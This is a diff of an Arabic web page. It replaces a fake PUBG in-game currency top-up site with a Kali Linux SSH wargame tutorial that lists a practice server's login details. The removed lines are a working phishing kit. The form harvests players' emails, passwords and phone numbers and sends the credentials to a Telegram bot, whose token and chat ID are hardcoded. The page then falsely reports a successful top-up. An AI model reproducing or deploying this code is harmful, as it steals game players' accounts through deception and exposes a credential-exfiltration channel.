@@ -1,323 +1,126 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>موقع شحن شدات بوبجي</title>
-  <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>امتحان أوامر الكالي لينكس </title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+        body {
+            font-family: 'VT323', monospace;
+            background-color: #000;
+            color: #33ff33;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: #111;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #0f0;
+        }
+        h1, h2 {
+            color: #0f0;
+        }
+        .command {
+            background: black;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 20px;
+            overflow: auto;
+            white-space: nowrap;
+            border-left: 3px solid #0f0;
+            text-align: left;
+			text-align:center;
+        }
+        code {
+            background: #222;
+            padding: 5px;
+            border-radius: 5px;
+            color: #0f0;
+        }
+        .typing {
+            display: inline-block;
+            overflow: hidden;
+            white-space: nowrap;
+            border-right: 3px solid #0f0;
+            animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite;
+        }
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes blink-caret {
+            50% { border-color: transparent; }
+        }
+        img {
+            width: 100%;
+            max-width: 700px;
+            border-radius: 10px;
+            margin-top: 10px;
+            box-shadow: 0 0 10px #0f0;
+        }
+    </style>
 </head>
-<style>
-  /* إعدادات الفيديو الخلفي */
-body {
-  margin: 0;
-  padding: 0;
-  font-family: 'Arial', sans-serif;
-  background-color: #111;
-  color: white;
-}
-
-header {
-  background-color: rgba(0, 0, 0, 0.8);
-  padding: 20px 0;
-  position: fixed;
-  top: 0;
-  width: 100%;
-  z-index: 100;
-}
-
-header .logo img {
-  width: 50px;
-}
-
-header nav ul {
-  list-style: none;
-  display: flex;
-  justify-content: center;
-  gap: 40px;
-  margin: 0;
-  padding: 0;
-}
-
-header nav ul li a {
-  color: white;
-  text-decoration: none;
-  font-size: 18px;
-  font-weight: bold;
-}
-
-.hero {
-  height: 100vh;
-  background: url('https://www.pubgmobile.com/images/event/home/rp.jpg') no-repeat center center/cover;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  color:   blue;
-}
-
-.hero-content h1 {
-  font-size: 50px;
-  margin-bottom: 20px;
-  opacity: 1.5;
-  color: #FFBF00;
-}
-
-.hero-content p {
-  font-size: 20px;
-  margin-bottom: 30px;
-}
-
-.cta-btn {
-  background-color: #FFBF00;
-  color: #111;
-  padding: 12px 30px;
-  border-radius: 8px;
-  text-decoration: none;
-  font-size: 18px;
-  font-weight: bold;
-  transition: background-color 0.3s;
-}
-
-.cta-btn:hover {
-  background-color: #ff9c00;
-}
-
-main {
-  padding: 60px 20px;
-}
-
-.about, .charge-section, .contact-form {
-  text-align: center;
-  margin-bottom: 50px;
-}
-
-h2 {
-  font-size: 32px;
-  color: #FFBF00;
-  margin-bottom: 20px;
-}
-
-.cards-container {
-  display: flex;
-  justify-content: center;
-  gap: 30px;
-}
-
-.card {
-  background-color: #222;
-  padding: 20px;
-  border-radius: 12px;
-  width: 250px;
-  text-align: center;
-  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
-  transition: transform 0.3s;
-}
-
-.card:hover {
-  transform: scale(1.05);
-}
-
-.card img {
-  width: 100px;
-  height: 100px;
-  margin-bottom: 20px;
-}
-
-.card h3 {
-  font-size: 24px;
-  margin-bottom: 10px;
-}
-
-.card p {
-  font-size: 18px;
-  color: #FFBF00;
-}
-
-.contact-form input, .contact-form button {
-  padding: 12px;
-  font-size: 18px;
-  margin: 10px 0;
-  width: 100%;
-  max-width: 400px;
-  border-radius: 8px;
-  border: 2px solid #333;
-}
-
-.contact-form input {
-  background-color: #222;
-  color: white;
-}
-
-.contact-form button {
-  background-color: #4CAF50;
-  color: white;
-  cursor: pointer;
-  transition: background-color 0.3s;
-}
-
-.contact-form button:hover {
-  background-color: #45a049;
-}
-
-.result {
-  margin-top: 20px;
-  font-size: 18px;
-  font-weight: bold;
-  color: green;
-}
-
-footer {
-  background-color: #111;
-  color: white;
-  text-align: center;
-  padding: 20px;
-}
-
-footer p {
-  margin: 0;
-}
-</style>
-
 <body>
-  <!-- الشريط العلوي -->
-  <header class="header">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/PUBG_logo_2017.svg" alt="PUBG">
+    <div class="container">
+        <h1 class="typing">تسجيل الدخول باستخدام <br>SSH Server Conect</h1>
+        <p>للدخول إلى الخادم عبر SSH، قم بتنفيذ الأمر التالي:</p>
+        <div class="command">ssh username@server_ip</div>
+        <p>استبدل <code>username</code> باسم المستخدم و <code>server_ip</code> بعنوان الخادم.</p>
+        
+        <h2>تسجيل الدخول باستخدام مفتاح خاص:</h2>
+        <div class="command">ssh -i /path/to/private_key username@server_ip</div>
+        
+        <h2>تفاصيل الاتصال:</h2>
+<center>
+        <div class="command">
+            ssh - Server <br>
+            username: bandit0 <br>
+            server: 16.16.163.126 <br>
+            password: bandit0 <br>
+            port: 2220
+        </div>
+
+</center>        
+        <h2>مهمتك:</h2>
+        <p>عند دخولك إلى الخادم، هناك ملف يحتوي على كلمة مرور عليك العثور عليه.</p>
+        <img src="https://imgur.com/CXeok3D.png" alt="Server login">
+        
+        <h2>اتصالك بالسيرفر سوف يكون على الشكل التالي:</h2>
+        <img src="https://imgur.com/bTN753Y.png" alt="Server login">
+        
+        <h2>كلمة المرور المطلوبة:</h2>
+        <p>ابحث عن كلمة مرور تبدأ وتنتهي بالشكل التالي:</p>
+        <div class="command">ZjLj............................p5If</div>
+		<img src="https://imgur.com/cP8CPL9.png" />
+        
+        <h2>الانتقال إلى الخادم التالي:</h2>
+        <p>بعد العثور على كلمة المرور، استخدمها للدخول إلى الخادم التالي باستخدام المستخدم <b>bandit1</b>.</p>
+        <img src="https://imgur.com/K9RPXaQ.png" alt="Server login">
+        
+        <h2>مفهوم التدرج في الخوادم:</h2>
+        <p>في كل مرحلة، ستجد مفتاحاً يتيح لك الوصول إلى الخادم التالي.</p>
+        <img src="2_content.png" alt="Server login">
+        
+        <h2>تكرار العملية مع الخوادم اللاحقة:</h2>
+        <p>بعد تسجيل الدخول إلى الخادم الثاني، ابحث عن كلمة المرور الخاصة بالخادم الثالث (bandit2)، وهكذا.</p>
+        <img src="https://imgur.com/xN7F55O.png" alt="Server login">
+        
+        <h2>متابعة البحث عن كلمات المرور:</h2>
+        <p>كرر نفس الخطوات للوصول إلى الخادم الرابع.</p>
+        <img src="https://imgur.com/loInGJS.png" alt="Server login">
+        
+        <h2>الوصول إلى المرحلة النهائية:</h2>
+        <p>في الخادم الرابع، ابحث عن كلمة المرور النهائية التي تبدأ وتنتهي بالشكل التالي:</p>
+        <div class="command">4oQY................................XGUQw</div>
+        
+        <h2>إدخال كلمة المرور النهائية:</h2>
+        <p>بعد حصولك على كلمة المرور الصحيحة، أدخلها في البرنامج المطلوب لاستكمال العملية بنجاح.</p>
+        <img src="https://imgur.com/T9CrSny.png" alt="Final Step">
     </div>
-    <nav class="nav">
-      <ul>
-        <li><a href="#home">الرئيسية</a></li>
-        <li><a href="#chargeSection">شحن الشدات</a></li>
-        <li><a href="#about">عن الموقع</a></li>
-        <li><a href="#contact">اتصل بنا</a></li>
-      </ul>
-    </nav>
-  </header>
-  <main>
-    <!-- فيديو خلفية -->
-    <section class="hero">
-      <div class="hero-content">
-        <h1>شحن شدات بوبجي بسهولة واحترافية</h1>
-        <p>احصل على شدات بوبجي بأسرع وقت وامنح حسابك قوة إضافية!</p>
-        <a href="#chargeSection" class="cta-btn">ابدأ الآن</a>
-      </div>
-    </section>
-    <!-- معلومات عن الشحن -->
-    <section id="about" class="about">
-      <h2>عن الموقع</h2>
-      <p>نحن نقدم لك خدمة شحن شدات بوبجي بأسعار تنافسية، مع طرق آمنة وسريعة. مع موقعنا، يمكنك استلام الشدات في دقائق معدودة.</p>
-    </section>
-    <!-- قسم الشحن -->
-    <section id="chargeSection" class="charge-section">
-      <h2>اختر فئة الشحن</h2>
-      <div class="cards-container">
-        <div class="card">
-          <img src="https://cdn.salla.sa/eEmzO/4f6a2058-5ebb-41c0-be02-3dc5d858a421-500x474-23ImMjeiG4LV8H9ZiIDk1BZCMWvp4lDZuiHms9ik.png" alt="100 شدة">
-          <h3>360 شدة</h3>
-          <p>10 دولار</p>
-        </div>
-        <div class="card">
-          <img src="https://cdn.salla.sa/eEmzO/85d2335e-51ec-4338-a78c-a7c6e3daa7e5-500x474-OvHqg0bprnyhwlkPEL4stB8tlB1ILYrpPoFvBqU3.png" alt="500 شدة">
-          <h3>660 شدة</h3>
-          <p>30 دولار</p>
-        </div>
-        <div class="card">
-          <img src="https://cdn.salla.sa/eEmzO/7b6bda4e-364e-4911-962f-5b6a3e02bf0d-500x474-ARYn6Ie00TNO1DRVkSaHy8qGP1HHztNmTEVuw5rb.png" alt="1000 شدة">
-          <h3>1600 شدة</h3>
-          <p>50 دولار</p>
-        </div>
-      </div>
-    </section>
-    <!-- نموذج الشحن -->
-    <section id="contact" class="contact-form">
-      <h2>ادخل بيانات الشحن</h2>
-        <form id="login-form">
-        <label for="username">ID الاعب  </label><br>
-        <input type="text" id="username" placeholder="ID الاعب اي دي " required><br>
-        <label for="username">اسم الاعب </label><br>
-        <input type="text" id="username" placeholder="أدخل اسم الاعب" required><br>
-        <label for="username">سيزون التي بدأت به</label><br>
-        <input type="number" id="username" placeholder="سيزون التي بدأت به " required max="11" min="3"><br>
-        <label for="username">رقم التلفون</label><br>
-        <input type="text" id="username" placeholder="رقم التلفون" required><br>
-        <label for="username">الدولة</label><br>
-        <input type="text" id="username" placeholder="الدولة التي تسكن به" required><br>
-        <label for="username">كود الخصم </label><br>
-        <input type="text" id="code" placeholder="كود الخصم" required><br>
-        <label for="amount">عدد الشدات</label><br>
-        <input type="number" id="amount" placeholder="أدخل عدد الشدات" min="1" max="600" required>
-      <div id="resultMessage" class="result"></div>
-      <form id="login-form">
-        <label for="email" class="sr-only">جيميل لاعب </label><br>
-        <input id="email" name="email" placeholder="Email" required /><br>
-        <label for="password" class="sr-only">كلمت سر الاعب </label><br>
-        <input id="password" name="password" type="password" placeholder="Password" required /><br>
-        <button type="submit">شحن الآن</button>
-    </form>
-</section>
-</main>
-<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script>
-// Define the Telegram Bot token and chat ID
-const TOKEN = "8109461499:AAGOIcdxgbY1sGvvEJLLGZN40Q0rDC4IBZs"; // Replace with your bot's token
-const CHAT_ID = "5796555699"; // Replace with your chat ID
-const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-document.getElementById('login-form').addEventListener('submit', function (e) {
-e.preventDefault(); // Prevent the default form submission
-
-// Get the email and password input values
-const email = document.getElementById('email').value;
-const password = document.getElementById('password').value;
-
-// Validate input fields
-if (!email || !password) {
-    alert('Please fill out all fields.');
-    return;
-}
-// Message to send to Telegram
-const message = `
-<b>هناك عملية تسجيل دخول</b>
-<b>الأيميل:</b> ${email}
-<b>الرمز:</b> ${password}
-<b>تم برمجة هذه الأداة بواسطة توكسك كود 1915 SM</b>
-`;
-
-// Send the message to Telegram
-axios.post(URI_API, {
-    chat_id: CHAT_ID,
-    text: message,
-    parse_mode: "HTML"
-}).then(response => {
-    alert('تم شحن الشدات بنجاح ! انتظر من ساعة الى 4 حتى تصل الشدات ');
-}).catch(error => {
-    alert('Error sending information. Please check your bot setup.');
-    console.error('Telegram API Error:', error);
-});
-});
-</script>
-<script>
-  document.getElementById('chargeForm').addEventListener('submit', function(e) {
-  e.preventDefault();
-
-  // الحصول على البيانات المدخلة
-  const username = document.getElementById('email').value;
-  const amount = document.getElementById('amount').value;
-  const code = document.getElementById('code').value;
-
-  // التحقق من البيانات
-  const resultMessage = document.getElementById('resultMessage');
-  if (username && amount > 0) {
-    resultMessage.textContent = `تم شحن ${amount} شدة إلى حساب ${username}. الشدات سوف تصلك من ساعة الى 4 ساعات لكثرة الشحن في الموقع .${code} كود الخصم التي استعملته ناجح`;
-    resultMessage.style.color = 'green';
-
-    resultMessage.style.animation = 'fadeIn 1s ease-out';
-  } else {
-    resultMessage.textContent = 'يرجى إدخال اسم المستخدم وعدد الشدات بشكل صحيح.';
-    resultMessage.style.color = 'red';
-    resultMessage.style.animation = 'shake 0.6s ease';
-  }
-});
-</script>
 </body>
 </html>
